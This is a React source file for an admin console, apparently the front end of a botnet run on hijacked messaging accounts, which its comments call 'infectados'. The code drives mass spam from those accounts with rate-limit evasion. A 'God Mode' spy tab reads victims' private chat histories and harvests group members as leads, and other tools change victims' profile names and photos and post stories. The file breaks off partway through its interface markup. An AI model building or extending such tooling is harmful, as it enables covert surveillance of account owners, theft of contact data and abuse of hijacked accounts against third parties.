import { useState, useEffect, useRef } from 'react';

export default function AdminPanel() {
  // --- ESTADOS DE AUTENTICAÇÃO ---
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginMode, setLoginMode] = useState('user'); // 'user' ou 'admin'
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [adminTokenInput, setAdminTokenInput] = useState('');
  const [authToken, setAuthToken] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  
  // --- NAVEGAÇÃO ---
  const [tab, setTab] = useState('dashboard'); 
  
  // --- DADOS DO SISTEMA ---
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  
  // --- ESTADOS DO CRM (DISPARO) ---
  const [processing, setProcessing] = useState(false);
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [imgUrl, setImgUrl] = useState(''); // URL da Imagem para o disparo
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [progress, setProgress] = useState(0);
  const [checkingStatus, setCheckingStatus] = useState(false);
  const stopCampaignRef = useRef(false); // Referência para o Botão de Parar

  // --- ESTADOS DO GOD MODE (ESPIÃO) ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [harvestedIds, setHarvestedIds] = useState(new Set()); // Lista de IDs já colhidos
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState('');
  const [isHarvestingAll, setIsHarvestingAll] = useState(false);
  const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
  const stopHarvestRef = useRef(false);

  // --- ESTADOS DE FERRAMENTAS ---
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- INICIALIZAÇÃO ---
  useEffect(() => {
    // Verifica se há token salvo no localStorage
    const savedToken = localStorage.getItem('authToken');
    if (savedToken) {
      setAuthToken(savedToken);
      setIsAuthenticated(true);
      // Decodifica JWT para verificar se é admin (sem verificar assinatura, apenas ler payload)
      try {
        const payload = JSON.parse(atob(savedToken.split('.')[1]));
        setIsAdmin(payload.isAdmin === true || payload.type === 'admin');
      } catch (e) {
        // Se não conseguir decodificar, assume que não é admin
        setIsAdmin(false);
      }
    }

    // Tenta recuperar cache local do scanner para não perder dados ao recarregar a página
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    
    if (savedGroups) {
        setAllGroups(JSON.parse(savedGroups));
    }
    if (savedChannels) {
        setAllChannels(JSON.parse(savedChannels));
    }
  }, []);

  useEffect(() => {
    // Se já estiver autenticado, busca os dados atualizados do servidor
    if (isAuthenticated && authToken) {
        fetchData();
    }
  }, [isAuthenticated, authToken]);

  // Função helper para fazer requisições autenticadas
  const authenticatedFetch = async (url, options = {}) => {
    const headers = {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${authToken}`,
      ...options.headers
    };
    return fetch(url, { ...options, headers });
  };

  const fetchData = async () => {
    try {
      // 1. Carrega Contas Infectadas
      const sRes = await authenticatedFetch('/api/list-sessions');
      const sData = await sRes.json();
      
      setSessions(prev => {
          const newSessions = sData.sessions || [];
          return newSessions.map(ns => {
              // Mantém o estado visual 'is_active' anterior para evitar que o ícone pisque
              const old = prev.find(p => p.phone_number === ns.phone_number);
              return { ...ns, is_active: old ? old.is_active : ns.is_active };
          });
      });
      
      // 2. Carrega Estatísticas de Leads
      const stRes = await authenticatedFetch('/api/stats');
      if (stRes.ok) {
          setStats(await stRes.json());
      }
      
      // 3. Carrega Memória de Grupos já Roubados (para marcar em verde)
      const hRes = await authenticatedFetch('/api/get-harvested');
      const hData = await hRes.json();
      if(hData.harvestedIds) {
          setHarvestedIds(new Set(hData.harvestedIds));
      }

    } catch (error) { 
        console.error("Erro ao sincronizar dados:", error); 
    }
  };

  const addLog = (text) => {
      setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
  };

  // --- AUTENTICAÇÃO ---
  const handleUserLogin = async (e) => {
    e.preventDefault();
    if (!usernameInput || !passwordInput) {
      alert('Preencha usuário e senha');
      return;
    }
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username: usernameInput, password: passwordInput })
      });
      const data = await res.json();
      if(data.success) { 
          setAuthToken(data.token);
          setIsAdmin(false);
          setIsAuthenticated(true);
          localStorage.setItem('authToken', data.token);
          setUsernameInput('');
          setPasswordInput('');
      } else {
          alert(data.error || 'Credenciais inválidas');
      }
    } catch (e) { 
        alert('Erro de conexão na autenticação.'); 
    }
  };

  const handleAdminTokenLogin = async (e) => {
    e.preventDefault();
    if (!adminTokenInput) {
      alert('Informe a senha administrativa');
      return;
    }
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ password: adminTokenInput })
      });
      const data = await res.json();
      if(data.success) { 
          setAuthToken(data.token);
          setIsAdmin(true);
          setIsAuthenticated(true);
          localStorage.setItem('authToken', data.token);
          setAdminTokenInput('');
      } else {
          alert(data.error || 'Senha incorreta');
      }
    } catch (e) { 
        alert('Erro de conexão na autenticação.'); 
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setAuthToken('');
    setIsAdmin(false);
    localStorage.removeItem('authToken');
  };

  // ==============================================================================
  // GESTÃO DE INFECTADOS (CHECK & SELEÇÃO)
  // ==============================================================================
  
  const checkAllStatus = async () => {
      if(sessions.length === 0) return;
      setCheckingStatus(true);
      addLog('🔍 Verificando integridade das contas (Sequencial)...');
      
      let currentSessions = [...sessions];
      
      // Verifica um por um para não sobrecarregar a API/Servidor
      for(let i=0; i < currentSessions.length; i++) {
          try {
              const res = await authenticatedFetch('/api/check-status', {
                  method: 'POST',
                  body: JSON.stringify({ phone: currentSessions[i].phone_number })
              });
              const data = await res.json();
              
              // Atualiza na hora o ícone (Verde/Vermelho)
              currentSessions[i].is_active = (data.status === 'alive');
              setSessions([...currentSessions]); 
          } catch(e) {
              console.error(e);
          }
      }
      setCheckingStatus(false);
      addLog('✅ Verificação de status finalizada.');
  };

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) {
        newSet.delete(phone); 
    } else {
        newSet.add(phone);
    }
    setSelectedPhones(newSet);
  };

  const selectAllActive = () => {
      const newSet = new Set();
      // Seleciona apenas quem está marcado como ativo (verde)
      sessions.forEach(s => { 
          if(s.is_active) newSet.add(s.phone_number) 
      });
      setSelectedPhones(newSet);
      addLog(`✅ Selecionadas ${newSet.size} contas online para disparo.`);
  };

  const handleDeleteSession = async (phone) => {
      if(!confirm(`⚠️ Remover permanentemente a conta ${phone}?`)) return;
      
      await authenticatedFetch('/api/delete-session', { 
          method: 'POST', 
          body: JSON.stringify({phone})
      });
      
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };

  // ==============================================================================
  // CRM TURBO: MOTOR DE DISPARO V6 (PRIORIDADE TOTAL + ESTRATÉGIA MISTA)
  // ==============================================================================

  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas remetentes (Infectados)!');
     
     if(!confirm(`⚠️ INICIAR DISPARO INTELIGENTE?\n\n1. Prioridade: @Usernames (Entrega Garantida)\n2. Secundário: IDs com Tática de Grupo/Contato\n\nLeads Pendentes: ${stats.pending}\nContas Ativas: ${selectedPhones.size}`)) return;

     setProcessing(true);
     stopCampaignRef.current = false; // Reseta a trava de parada
     setProgress(0);
     addLog('🚀 Motor V6 Iniciado (Estratégia Híbrida)...');
     
     try {
         // Cria uma lista de remetentes disponíveis
         let availableSenders = Array.from(selectedPhones);
         // Mapa de "Geladeira" (Quem tomou flood fica aqui com o tempo de desbloqueio)
         const floodCoolDown = new Map(); 

         // CONFIGURAÇÃO ANTI-FLOOD OTIMIZADA
         const BATCH_SIZE = 12; // 12 Envios simultâneos
         const DELAY_BETWEEN_BATCHES = 3500; // 3.5 segundos de pausa entre lotes
         const LEADS_PER_FETCH = 200; // Busca leads no banco de 200 em 200

         let totalSentCount = 0;

         while (true) {
             // VERIFICAÇÃO DE PARADA DE EMERGÊNCIA
             if (stopCampaignRef.current) {
                 addLog('🛑 Disparo interrompido manualmente pelo usuário.');
                 break;
             }

             // --- GESTÃO DA GELADEIRA (COOLDOWN) ---
             const now = Date.now();
             for (const [phone, unlockTime] of floodCoolDown.entries()) {
                 if (now > unlockTime) {
                     availableSenders.push(phone); // Devolve a conta para a lista
                     floodCoolDown.delete(phone); // Remove da geladeira
                     addLog(`❄️ Conta ${phone} saiu da geladeira e voltou à ativa.`);
                 }
             }

             if (availableSenders.length === 0) {
                 addLog('⚠️ Todas as contas estão em descanso (Flood). Aguardando 1 min...');
                 await new Promise(r => setTimeout(r, 60000));
                 continue; // Tenta de novo após 1 minuto
             }

             // 1. Busca um lote de leads pendentes no banco
             // A API get-campaign-leads JÁ ESTÁ configurada para trazer Usernames primeiro
             const res = await authenticatedFetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}`);
             const data = await res.json();
             const leads = data.leads || [];
             
             if (leads.length === 0) {
                 addLog('✅ Sem mais leads pendentes no banco.');
                 break; 
             }

             // 2. Processa esse lote em pequenos grupos (Batches)
             for (let i = 0; i < leads.length; i += BATCH_SIZE) {
                 // Verifica parada novamente dentro do sub-loop
                 if (stopCampaignRef.current) break;

                 const batch = leads.slice(i, i + BATCH_SIZE);
                 
                 const promises = batch.map((lead, index) => {
                     // Verifica se ainda tem contas disponíveis
                     if (availableSenders.length === 0) return null;

                     // Rodízio (Round-Robin): Distribui o envio entre as contas saudáveis
                     const senderIndex = (totalSentCount + index) % availableSenders.length;
                     const sender = availableSenders[senderIndex];
                     
                     return authenticatedFetch('/api/dispatch', {
                         method: 'POST',
                         body: JSON.stringify({
                             senderPhone: sender,
                             target: lead.user_id,
                             username: lead.username, // Se tiver, o backend usa. Se não, tenta o ID.
                             originChatId: lead.chat_id, // IMPORTANTE: Envia o ID do grupo original para tentar a busca
                             message: msg,
                             imageUrl: imgUrl,
                             leadDbId: lead.id
                         })
                     }).then(async (response) => {
                         const d = await response.json();
                         
                         if (response.status === 429) {
                             // SE DER FLOOD:
                             addLog(`🥶 ${sender} tomou FLOOD. Pausando ela por 5 min.`);
                             // Remove da lista de ativos agora mesmo
                             availableSenders = availableSenders.filter(p => p !== sender);
                             // Põe na geladeira por 5 min (300000 ms)
                             floodCoolDown.set(sender, Date.now() + 300000);
                         } else if (!d.success) {
                             // Outros erros (Privacidade, etc) apenas registram
                             // addLog(`❌ Falha ${sender}: ${d.error}`); // Comentado para limpar logs
                         }
                         return d;
                     }).catch(err => {
                         console.error(err);
                     });
                 });

                 // Aguarda o lote atual terminar antes de ir para o próximo
                 await Promise.all(promises);
                 
                 totalSentCount += batch.length;
                 // Atualiza barra de progresso
                 setProgress(stats.pending ? Math.round((totalSentCount / stats.pending) * 100) : 100);
                 
                 // Pausa estratégica para evitar PEER_FLOOD
                 await new Promise(r => setTimeout(r, DELAY_BETWEEN_BATCHES));
             }

             // Se veio menos leads do que o limite, é porque acabou
             if (leads.length < LEADS_PER_FETCH) break;
         }

         addLog(`✅ Disparo concluído com sucesso. Total processado: ${totalSentCount}`);
         fetchData(); // Atualiza contadores
     } catch (e) { 
         addLog(`⛔ Erro Crítico no Motor: ${e.message}`); 
     }
     setProcessing(false);
  };

  const stopCampaign = () => {
      stopCampaignRef.current = true;
      addLog('🛑 Solicitando parada imediata do disparo...');
  };

  // ==============================================================================
  // GOD MODE: SCANNER & MODO ASPIRADOR
  // ==============================================================================

  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Nenhuma conta para escanear.");
      setIsScanning(true);
      setScanProgress(0);
      let groupsFound = [];
      let channelsFound = [];

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          try {
              const res = await authenticatedFetch('/api/spy/list-chats', { 
                  method: 'POST', 
                  body: JSON.stringify({ phone })
              });
              const data = await res.json();
              if (data.chats) {
                  data.chats.forEach(c => {
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') {
                          channelsFound.push(chatObj); 
                      } else {
                          groupsFound.push(chatObj);
                      }
                  });
              }
          } catch (e) {
              console.error(e);
          }
      }

      // Remove duplicatas e ordena por tamanho
      const uniqueGroups = [...new Map(groupsFound.map(item => [item.id, item])).values()].sort((a,b) => b.participantsCount - a.participantsCount);
      const uniqueChannels = [...new Map(channelsFound.map(item => [item.id, item])).values()].sort((a,b) => b.participantsCount - a.participantsCount);

      setAllGroups(uniqueGroups);
      setAllChannels(uniqueChannels);
      
      // Salva no navegador
      localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
      localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));
      
      setIsScanning(false);
  };

  const startMassHarvest = async () => {
      const targets = [...allGroups, ...allChannels].filter(c => !harvestedIds.has(c.id));
      
      if (targets.length === 0) return alert("Nada novo para colher. Use o 'Scan' para achar novos grupos.");
      
      if (!confirm(`🕷️ MODO ASPIRADOR: Coletar leads de ${targets.length} fontes automaticamente?`)) return;

      setIsHarvestingAll(true);
      stopHarvestRef.current = false;
      let sessionCount = 0;

      addLog(`🕷️ Iniciando Aspiração em ${targets.length} chats...`);

      for (let i = 0; i < targets.length; i++) {
          if (stopHarvestRef.current) break;
          const target = targets[i];
          
          try {
              const res = await authenticatedFetch('/api/spy/harvest', { 
                  method: 'POST', 
                  body: JSON.stringify({ 
                      phone: target.ownerPhone, 
                      chatId: target.id, 
                      chatName: target.title, 
                      isChannel: target.type === 'Canal' 
                  })
              });
              const data = await res.json();
              if(data.success) {
                  sessionCount += data.count;
                  setTotalHarvestedSession(sessionCount);
                  setHarvestedIds(prev => new Set(prev).add(target.id)); // Marca visualmente como colhido
                  addLog(`✅ +${data.count} leads de "${target.title}"`);
              }
          } catch (e) {
              // Ignora erro e continua para o próximo
          }
          // Delay de 2.5s entre grupos para não sobrecarregar
          await new Promise(r => setTimeout(r, 2500));
      }
      setIsHarvestingAll(false);
      addLog(`🏁 Aspiração Finalizada. Total capturado: ${sessionCount}`);
      fetchData();
  };

  // --- VISUALIZAÇÃO E AÇÕES MANUAIS ---
  const openChatViewer = async (chat) => {
      setViewingChat(chat);
      setLoadingHistory(true);
      setChatHistory([]);
      try {
        const res = await authenticatedFetch('/api/spy/get-history', { 
            method: 'POST', 
            body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id })
        });
        const data = await res.json();
        setChatHistory(data.history || []);
      } catch (e) { 
          alert('Erro ao carregar mensagens.'); 
      }
      setLoadingHistory(false);
  };

  const stealLeadsManual = async (chat) => {
      addLog(`🕷️ Extraindo manualmente de ${chat.title}...`);
      const res = await authenticatedFetch('/api/spy/harvest', { 
          method: 'POST', 
          body: JSON.stringify({ 
              phone: chat.ownerPhone, 
              chatId: chat.id, 
              chatName: chat.title, 
              isChannel: chat.type === 'Canal' 
          })
      });
      const data = await res.json();
      if(data.success) {
          addLog(`✅ +${data.count} leads capturados.`);
          setHarvestedIds(prev => new Set(prev).add(chat.id));
          fetchData();
      } else { 
          addLog(`❌ Falha: ${data.error}`); 
      }
  };

  // ==============================================================================
  // TOOLS: PERFIS E STORIES
  // ==============================================================================

  const handleMassUpdateProfile = async () => {
    if (selectedPhones.size === 0) return alert('Selecione as contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) {
        addLog(`🎭 Atualizando identidade em ${phone}...`);
        await authenticatedFetch('/api/update-profile', { 
            method: 'POST', 
            body: JSON.stringify({ phone, newName, photoUrl })
        });
    }
    setProcessing(false); 
    addLog('✅ Identidades atualizadas.');
  };

  const handleMassPostStory = async () => {
      if (selectedPhones.size === 0) return alert('Selecione as contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) {
          addLog(`📸 Postando Story em ${phone}...`);
          await authenticatedFetch('/api/post-story', { 
              method: 'POST', 
              body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption })
          });
      }
      setProcessing(false); 
      addLog('✅ Stories postados.');
  };

  // Filtros de busca
  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;

  // --- RENDERIZAÇÃO (INTERFACE GRÁFICA) ---
  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center', flexDirection:'column', gap:'20px'}}>
          <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
              <button onClick={()=>setLoginMode('user')} style={{padding:'10px 20px', background: loginMode==='user'?'#3390ec':'transparent', color:'white', border:'1px solid #3390ec', borderRadius:'6px', cursor:'pointer'}}>Login Usuário</button>
              <button onClick={()=>setLoginMode('admin')} style={{padding:'10px 20px', background: loginMode==='admin'?'#3390ec':'transparent', color:'white', border:'1px solid #3390ec', borderRadius:'6px', cursor:'pointer'}}>Token Admin</button>
          </div>
          
          {loginMode === 'user' ? (
              <form onSubmit={handleUserLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
                  <h2 style={{color:'white', textAlign:'center', marginTop:0, fontFamily:'monospace'}}>HOTTRACK ADMIN</h2>
                  <input type="text" value={usernameInput} onChange={e=>setUsernameInput(e.target.value)} placeholder="Usuário" style={{padding:'15px', width:'250px', marginBottom:'10px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white', display:'block'}} autoFocus />
                  <input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha" style={{padding:'15px', width:'250px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white', display:'block'}} />
                  <button type="submit" style={{width:'100%', padding:'15px', marginTop:'10px', background:'#3390ec', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}>Entrar</button>
              </form>
          ) : (
              <form onSubmit={handleAdminTokenLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #8957e5', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
                  <h2 style={{color:'white', textAlign:'center', marginTop:0, fontFamily:'monospace'}}>TOKEN ADMINISTRATIVO</h2>
                  <input type="password" value={adminTokenInput} onChange={e=>setAdminTokenInput(e.target.value)} placeholder="Senha Administrativa" style={{padding:'15px', width:'250px', borderRadius:'8px', border:'none', outline:'none', fontSize:'16px', background:'#0d1117', color:'white'}} autoFocus />
                  <button type="submit" style={{width:'100%', padding:'15px', marginTop:'10px', background:'#8957e5', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold'}}>Entrar</button>
              </form>
          )}
      </div>
  );

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
        
        {/* MODAL DE CHAT */}
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <div style={{width:'700px', height:'85%', background:'#161b22', border:'1px solid #30363d', borderRadius:'12px', display:'flex', flexDirection:'column', overflow:'hidden'}}>
                    <div style={{padding:'15px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between', alignItems:'center', background:'#21262d'}}>
                        <div>
                            <h3 style={{margin:0, color:'white'}}>{viewingChat.title}</h3>
                            <small style={{color:'#8b949e'}}>Monitorado via: {viewingChat.ownerPhone}</small>
                        </div>
                        <button onClick={()=>setViewingChat(null)} style={{background:'none', border:'none', color:'#ff5c5c', fontSize:'24px', cursor:'pointer'}}>✖</button>
                    </div>
                    <div style={{flex:1, overflowY:'auto', padding:'20px', display:'flex', flexDirection:'column', gap:'15px'}}>
                        {loadingHistory ? <p style={{textAlign:'center', color:'#3390ec'}}>Carregando histórico...</p> : 
                            chatHistory.length === 0 ? <p style={{textAlign:'center'}}>Sem mensagens recentes.</p> :
                            chatHistory.map((m, i) => (
                                <div key={i} style={{alignSelf: m.isOut ? 'flex-end' : 'flex-start', background: m.isOut ? '#238636' : '#30363d', padding:'12px', borderRadius:'10px', maxWidth:'85%', border:'1px solid rgba(255,255,255,0.05)'}}>
                                    <div style={{fontSize:'11px', fontWeight:'bold', marginBottom:'5px', color: m.isOut ? '#afffb0' : '#3390ec'}}>{m.sender}</div>
                                    {m.media && (
                                        <div style={{marginBottom:'10px'}}>
                                            <img src={m.media} alt="Mídia" style={{maxWidth:'100%', borderRadius:'8px'}} />
                                        </div>
                                    )}
                                    <div style={{color:'white', whiteSpace:'pre-wrap', fontSize:'14px'}}>{m.text}</div>
                                </div>
                            ))
                        }
                    </div>
                </div>
            </div>
        )}

        {/* MENU SUPERIOR */}
        <div style={{marginBottom:'25px', display:'flex', gap:'10px', borderBottom:'1px solid #30363d', paddingBottom:'15px', alignItems:'center'}}>
            <h2 style={{margin:0, marginRight:'20px', color:'white', fontFamily:'monospace'}}>HOTTRACK</h2>
            <button onClick={()=>setTab('dashboard')} style={{padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', color:'white', border:'1px solid #238636', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🚀 CRM TURBO</button>
            <button onClick={()=>setTab('spy')} style={{padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', color:'white', border:'1px solid #8957e5', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👁️ GOD MODE</button>
            <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🛠️ TOOLS</button>
            <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e', display:'flex', alignItems:'center', gap:'15px'}}>
                {isAdmin && <span style={{color:'#8957e5', fontWeight:'bold'}}>🔑 ADMIN</span>}
                <span>v6.0 (Estratégia Híbrida)</span>
                <button onClick={handleLogout} style={{padding:'8px 15px', background:'#f85149', color:'white', border:'none', borderRadius:'6px', cursor:'pointer', fontSize:'12px', fontWeight:'bold'}}>Sair</button>
            </div>
        </div>

        {/* --- ABA DASHBOARD (DISPARO) --- */}
        {tab === 'dashboard' && (
             <div style={{display:'grid', gridTemplateColumns:'1.5fr 1fr', gap:'25px'}}>
                
                {/* PAINEL ESQUERDO: CONFIGURAÇÃO */}
                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                    <div style={{display:'flex', gap:'20px', marginBottom:'25px'}}>
                        <div style={{flex:1, background:'#0d1117', border:'1px solid #d29922', padding:'20px', textAlign:'center', borderRadius:'10px'}}>
                            <h2 style={{margin:0, color:'#d29922', fontSize:'32px'}}>{stats.pending?.toLocaleString()}</h2>
                            <small style={{textTransform:'uppercase', letterSpacing:'1px', opacity:0.7}}>Leads Pendentes</small>
                        </div>
                        <div style={{flex:1, background:'#0d1117', border:'1px solid #238636', padding:'20px', textAlign:'center', borderRadius:'10px'}}>
                            <h2 style={{margin:0, color:'#238636', fontSize:'32px'}}>{stats.sent?.toLocaleString()}</h2>
                            <small style={{textTransform:'uppercase', letterSpacing:'1px', opacity:0.7}}>Total Enviado</small>
                        </div>
                    </div>
                    
                    <h3 style={{marginTop:0, marginBottom:'15px', color:'#3390ec'}}>Configurar Campanha Massiva</h3>
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Imagem do Anúncio (URL):</label>
                    <input type="text" placeholder="https://i.imgur.com/exemplo.jpg" value={imgUrl} onChange={e=>setImgUrl(e.target.value)} style={{width:'100%', padding:'14px', marginBottom:'20px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'8px', fontSize:'14px'}} />
                    
                    <label style={{display:'block', marginBottom:'8px', fontSize:'13px', fontWeight:'bold'}}>Mensagem (Spintax ativo):</label>
                    <textarea value={msg} onChange={e=>setMsg(e.target.value)} placeholder="Olá {amigo|parceiro}, tudo bem?" style={{width:'100%', height:'120px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'14px', borderRadius:'8px', fontSize:'15px', lineHeight:'1.5', resize:'none'}}/>
                    
                    <div style={{display:'flex', gap:'15px', marginTop:'20px'}}>
                        {!processing ? (
                            <button onClick={startRealCampaign} style={{flex:1, padding:'20px', background:'#238636', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'18px', transition:'0.3s', boxShadow:'0 4px 15px rgba(35, 134, 54, 0.3)'}}>
                                🔥 INICIAR ATAQUE TURBO
                            </button>
                        ) : (
                            <button onClick={stopCampaign} style={{flex:1, padding:'20px', background:'#f85149', color:'white', fontWeight:'bold', border:'none', borderRadius:'10px', cursor:'pointer', fontSize:'18px', boxShadow:'0 4px 15px rgba(248, 81, 73, 0.3)'}}>
                                🛑 PARAR DISPARO IMEDIATAMENTE
                            </button>
                        )}
                    </div>
                    
                    <div style={{marginTop:'25px'}}>
                        <div style={{display:'flex', justifyContent:'space-between', marginBottom:'10px'}}>
                            <span style={{fontSize:'12px', fontWeight:'bold'}}>LOGS DO SISTEMA {processing ? `(${progress}%)` : ''}</span>
                            <button onClick={()=>setLogs([])} style={{background:'none', border:'none', color:'#8b949e', cursor:'pointer', fontSize:'11px'}}>Limpar Logs</button>
                        </div>
                        <div style={{height:'200px', overflowY:'auto', background:'#000', padding:'15px', fontSize:'12px', borderRadius:'8px', border:'1px solid #30363d', color:'#00ff00', fontFamily:'"Courier New", Courier, monospace'}}>
                            {logs.map((l,i)=><div key={i} style={{marginBottom:'4px'}}>{l}</div>)}
                        </div>
                    </div>
                </div>

                {/* PAINEL DIREITO: INFECTADOS */}
                <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d', display:'flex', flexDirection:'column'}}>
                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px'}}>
                        <h3 style={{margin:0}}>Infectados ({sessions.length})</h3>
                        <button onClick={checkAllStatus} disabled={checkingStatus} style={{fontSize:'12px', padding:'8px 15px', background:'#1f6feb', color:'white', border:'none', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>
                            {checkingStatus ? '🔄 CHECANDO...' : '⚡ CHECK STATUS'}
                        </button>
                    </div>

                    <div style={{display:'flex', gap:'15px', marginBottom:'20px', padding:'10px', background:'#0d1117', borderRadius:'8px', border:'1px solid #21262d'}}>
                        <div style={{flex:1, textAlign:'center'}}><div style={{color:'#238636', fontSize:'18px', fontWeight:'bold'}}>{sessions.filter(s=>s.is_active).length}</div><small>ONLINE</small></div>
                        <div style={{width:'1px', background:'#30363d'}}></div>
                        <div style={{flex:1, textAlign:'center'}}><div style={{color:'#f85149', fontSize:'18px', fontWeight:'bold'}}>{sessions.filter(s=>!s.is_active).length}</div><small>OFFLINE</small></div>
                    </div>
                    
                    <button onClick={selectAllActive} style={{width:'100%', padding:'12px', background:'#30363d', color:'white', border:'none', borderRadius:'8px', cursor:'pointer', marginBottom:'15px', fontWeight:'bold', fontSize:'13px'}}>SELECIONAR TODOS ONLINE</button>
                    
                    <div style={{flex:1, maxHeight:'600px', overflowY:'auto', paddingRight:'5px'}}>
                        {sessions.map(s => (
                            <div key={s.id} style={{padding:'12px', marginBottom:'8px', borderRadius:'8px', border:'1px solid #30363d', display:'flex', justifyContent:'space-between', alignItems:'center', background: selectedPhones.has(s.phone_number) ? 'rgba(51, 144, 236, 0.1)' : '#0d1117'}}>
                                <div style={{display:'flex', alignItems:'center', gap:'12px'}}>
                                    <div style={{width:'10px', height:'10px', borderRadius:'50%', background: s.is_active ? '#238636' : '#f85149', boxShadow: s.is_active ? '0 0 10px #238636' : 'none'}}></div>
                                    <div>
                                        <div style={{fontSize:'14px', fontWeight:'bold', color: s.is_active ? 'white' : '#8b949e'}}>{s.phone_number}</div>
                                        <div style={{fontSize:'10px', opacity:0.5}}>{new Date(s.created_at).toLocaleDateString()}</div>
                                    </div>
                                </div>
                                <div style={{display:'flex', gap:'8px'}}>
                                    <input type="checkbox" checked={selectedPhones.has(s.phone_number)} onChange={()=>toggleSelect(s.phone_number)} style={{width:'20px', height:'20px', cursor:'pointer'}} />
                                    <button onClick={()=>handleDeleteSession(s.phone_number)} style={{background:'none', border:'none', color:'#f85149', cursor:'pointer', fontSize:'16px'}}>🗑️</button>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
             </div>
        )}

        {/* --- ABA GOD MODE (ESPIÃO) --- */}
        {tab === 'spy' && (
            <div style={{background:'#161b22', padding:'25px', borderRadius:'12px', border:'1px solid #30363d'}}>
                <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px'}}>
                    <div>
                        <h2 style={{margin:0, color:'white'}}>Radar Global de Leads</h2>
                        <div style={{fontSize:'14px', color:'#8b949e', marginTop:'5px'}}>
                            {allGroups.length} Grupos e {allChannels.length} Canais mapeados nas contas
                        </div>
                    </div>
                    <div style={{display:'flex', gap:'12px', alignItems:'center'}}>
